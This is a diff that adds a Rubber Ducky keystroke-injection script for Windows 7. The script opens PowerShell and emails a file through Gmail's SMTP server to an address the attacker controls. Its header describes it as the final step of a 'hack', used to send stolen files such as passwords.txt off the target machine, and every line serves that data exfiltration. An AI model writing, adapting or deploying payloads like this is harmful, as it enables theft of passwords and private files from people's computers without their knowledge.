@@ -1,0 +1,37 @@
+REM Author: ccodingsKILLS
+REM How to use ducky script to send an email via Powershell on Windows
+REM Target: Windows 7
+REM Description: This is a nice way to end a Rubber Ducky hack. If you have got some sort of file (passwords.txt for example)
+REM and the final step of your hack is to email this file to yourself, this script covers that
+DELAY 500
+REM -------------email log via gmail
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAIL@gmail.com', 'PASSWORD');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'YOUREMAIL@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('YOUREMAIL@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'SUBJECT'
+ENTER
+STRING $ReportEmail.Body = 'Attached.' 
+ENTER
+STRING $ReportEmail.Attachments.Add('DIRECTORY')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
